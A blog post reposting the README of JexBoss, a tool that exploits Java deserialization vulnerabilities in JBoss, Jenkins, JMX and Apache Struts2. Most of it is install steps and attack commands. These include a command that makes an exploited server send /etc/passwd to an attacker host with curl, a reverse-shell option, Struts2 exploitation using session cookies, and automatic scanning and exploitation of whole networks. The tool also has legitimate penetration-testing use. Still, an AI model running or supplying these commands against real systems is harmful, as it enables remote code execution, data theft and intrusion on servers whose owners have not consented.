---
author: heh3.org
comments: true
date: 2017-03-30 05:28:02+00:00
layout: post
link: http://heh3.org/?p=84
slug: jexboss-jboss-and-others-java-deserialization-vulnerabilities-verify-and-exploitation-tool
title: JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and
  EXploitation Tool
wordpress_id: 84
categories:
- tools
tags:
- jboss
- jexboss
- s2-045
- 反序列化
---

JexBoss是一个测试JBOSS和其他一些java平台框架漏洞的工具（java反序列化漏洞）

安装


#### Installation on Linux\Mac



    
    <code>git clone https://github.com/joaomatosf/jexboss.git
    cd jexboss
    pip install -r requires.txt
    python jexboss.py -h
    python jexboss.py -host http://target_host:8080
    
    OR:
    
    Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip
    unzip master.zip
    cd jexboss-master
    pip install -r requires.txt
    python jexboss.py -h
    python jexboss.py -host http://target_host:8080
    </code>




#### Installation on Windows



    
    <code>git clone https://github.com/joaomatosf/jexboss.git
    cd jexboss
    pip install -r requires.txt
    python jexboss.py -h
    python jexboss.py -host http://target_host:8080
    </code>


特性：
java反序列化漏洞检测，支持多种java平台与应用

（例如：



 	
  1. java server faces-jsf，

 	
  2. Seam framework，

 	
  3. RMI over HTTP,

 	
  4. Jenkins CLI RCE (cve-2015-5317),

 	
  5. Remote JMX(CVE--2016-3427,CVE-2016-8735)）

 	
  6. Apache struts2(RCE)(CVE-2017-5638)


The exploitation Vectors are:

    
    <code>/admin-console
    tested and working in JBoss versions 5 and 6
    /jmx-console
    tested and working in JBoss versions 4, 5 and 6
    /web-console/Invoker
    tested and working in JBoss versions 4, 5 and 6
    /invoker/JMXInvokerServlet
    tested and working in JBoss versions 4, 5 and 6
    Application Deserialization
    tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters
    Servlet Deserialization
    tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an "Invoker" in a link)
    Apache Struts2 CVE-2017-5638
    tested in Apache Struts 2 applications
    Others
    </code>


用法示例：
Usage examples

For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server:

    
    <code>$ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'
    </code>


For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host):

    
    <code>$ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name
    </code>


For Java Deserialization Vulnerabilities in a Servlet (like Invoker):

    
    <code>$ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize
    </code>


For Apache Struts 2 (CVE-2017-5638)

    
    <code>$ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2
    </code>


For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources

    
    <code>$ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies "JSESSIONID=24517D9075136F202DCE20E9C89D424D"
    </code>


Auto scan mode:

    
    <code>$ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log
    </code>


File scan mode:

    
    <code>$ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log
    </code>


More Options:

    
    <code>optional arguments:
      -h, --help            show this help message and exit
      --version             show program's version number and exit
      --auto-exploit, -A    Send exploit code automatically (USE ONLY IF YOU HAVE
                            PERMISSION!!!)
      --disable-check-updates, -D
                            Disable two updates checks: 1) Check for updates
                            performed by the webshell in exploited server at
                            http://webshell.jexboss.net/jsp_version.txt and 2)
                            check for updates performed by the jexboss client at
                            http://joaomatosf.com/rnp/releases.txt
      -mode {standalone,auto-scan,file-scan}
                            Operation mode (DEFAULT: standalone)
      --app-unserialize, -j
                            Check for java unserialization vulnerabilities in HTTP
                            parameters (eg. javax.faces.ViewState, oldFormData,
                            etc)
      --servlet-unserialize, -l
                            Check for java unserialization vulnerabilities in
                            Servlets (like Invoker interfaces)
      --jboss               Check only for JBOSS vectors.
      --jenkins             Check only for Jenkins CLI vector.
      --jmxtomcat           Check JMX JmxRemoteLifecycleListener in Tomcat
                            (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be
                            checked by default.
      --proxy PROXY, -P PROXY
                            Use a http proxy to connect to the target URL (eg. -P
                            http://192.168.0.1:3128)
      --proxy-cred LOGIN:PASS, -L LOGIN:PASS
                            Proxy authentication credentials (eg -L name:password)
      --jboss-login LOGIN:PASS, -J LOGIN:PASS
                            JBoss login and password for exploit admin-console in
                            JBoss 5 and JBoss 6 (default: admin:admin)
      --timeout TIMEOUT     Seconds to wait before timeout connection (default 3)
    
    Standalone mode:
      -host HOST, -u HOST   Host address to be checked (eg. -u
                            http://192.168.0.10:8080)
    
    Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER):
      --reverse-host RHOST:RPORT, -r RHOST:RPORT
                            Remote host address and port for reverse shell when
                            exploiting Java Deserialization Vulnerabilities in
                            application layer (for now, working only against *nix
                            systems)(eg. 192.168.0.10:1331)
      --cmd CMD, -x CMD     Send specific command to run on target (eg. curl -d
                            @/etc/passwd http://your_server)
      --windows, -w         Specifies that the commands are for rWINDOWS System$
                            (cmd.exe)
      --post-parameter PARAMETER, -H PARAMETER
                            Specify the parameter to find and inject serialized
                            objects into it. (egs. -H javax.faces.ViewState or -H
                            oldFormData (<- Hi PayPal =X) or others) (DEFAULT:
                            javax.faces.ViewState)
      --show-payload, -t    Print the generated payload.
      --gadget {commons-collections3.1,commons-collections4.0,groovy1}
                            Specify the type of Gadget to generate the payload
                            automatically. (DEFAULT: commons-collections3.1 or
                            groovy1 for JenKins)
      --load-gadget FILENAME
                            Provide your own gadget from file (a java serialized
                            object in RAW mode)
      --force, -F           Force send java serialized gadgets to URL informed in
                            -u parameter. This will send the payload in multiple
                            formats (eg. RAW, GZIPED and BASE64) and with
                            different Content-Types.
    
    Auto scan mode:
      -network NETWORK      Network to be checked in CIDR format (eg. 10.0.0.0/8)
      -ports PORTS          List of ports separated by commas to be checked for
                            each host (eg. 8080,8443,8888,80,443)
      -results FILENAME     File name to store the auto scan results
    
    File scan mode:
      -file FILENAME_HOSTS  Filename with host list to be scanned (one host per
                            line)
      -out FILENAME_RESULTS
                            File name to store the file scan results
    
    reference:https://github.com/joaomatosf/jexboss
    </code><a href="mailto:joaomatosf@gmail.com">joaomatosf@gmail.com</a>
